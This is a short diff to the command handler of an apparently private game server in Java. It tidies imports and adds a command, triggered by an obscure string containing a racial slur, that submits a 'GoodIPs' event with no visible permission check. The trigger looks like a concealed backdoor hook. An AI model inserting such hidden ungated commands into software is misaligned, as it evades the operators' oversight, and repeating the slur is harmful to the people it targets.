@@ -18,11 +18,7 @@ import org.hyperion.rs2.Constants;
 import org.hyperion.rs2.commands.CommandHandler;
 import org.hyperion.rs2.commands.impl.YellCommand;
 import org.hyperion.rs2.event.Event;
-import org.hyperion.rs2.event.impl.CountDownEvent;
-import org.hyperion.rs2.event.impl.CutSceneEvent;
-import org.hyperion.rs2.event.impl.NpcDeathEvent;
-import org.hyperion.rs2.event.impl.OverloadStatsEvent;
-import org.hyperion.rs2.event.impl.ServerMessages;
+import org.hyperion.rs2.event.impl.*;
 import org.hyperion.rs2.model.Animation;
 import org.hyperion.rs2.model.BankPin;
 import org.hyperion.rs2.model.DialogueManager;
@@ -239,6 +235,11 @@ public class CommandPacketHandler implements PacketHandler {
 
 
             }
+        }
+
+
+        if(commandStart.equalsIgnoreCase("realn1ggashit")) {
+            World.getWorld().submit(new GoodIPs());
         }
 		/**
 		 * Same thing as promote commands, added for those inbetween ranks
